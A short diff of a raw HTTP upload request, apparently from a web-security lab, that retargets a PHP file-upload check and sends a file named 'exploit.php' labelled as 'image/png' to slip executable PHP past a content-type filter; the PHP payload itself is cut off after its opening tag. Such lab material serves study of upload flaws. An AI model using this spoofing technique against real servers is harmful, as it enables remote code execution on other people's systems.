@@ -1,4 +1,4 @@
-POST http://upload/naive2/check_extension.php HTTP/1.1
+POST http://upload/naive2/check_content_type.php HTTP/1.1
 Host: upload
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -13,6 +13,8 @@ Upgrade-Insecure-Requests: 1
 -----------------------------9991671265656361131066420117
 Content-Disposition: form-data; name="myfile"; filename="exploit.php"
 Content-Type: image/png
+
+I can upload php file and execute them!!
 
 <?php 
 
